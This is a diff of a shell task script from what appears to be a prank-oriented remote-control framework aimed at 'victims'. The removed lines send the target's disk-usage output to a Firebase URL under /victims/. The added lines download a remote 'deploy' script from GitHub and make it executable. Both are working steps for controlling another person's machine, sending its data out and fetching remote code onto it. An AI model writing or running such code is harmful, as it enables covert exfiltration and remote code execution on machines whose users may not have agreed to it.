@@ -23,14 +23,11 @@ rootIteration="$2"
 
 # Your own code
 
-# Always write data to this tasks location.
-#e.g.
-
-result=`df -h | grep '/$'`
-curl -X PUT -d "{\"df_h\" : \"$result\" }" "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID.json"
+curl "https://raw.githubusercontent.com/thiesgehrmann/arduinoPranks/master/websiteReactionPrank/deploy" > "$SCRIPTDIR/deploy"
+chmod +x "$SCRIPTDIR/deploy"
 
 #If you want to swap to another task, you can do it like so:
-# setVictimTask "$victim" "default"
+# setVictimTask "$victim" "_previous_task_"
 
 ###############################################################################
 
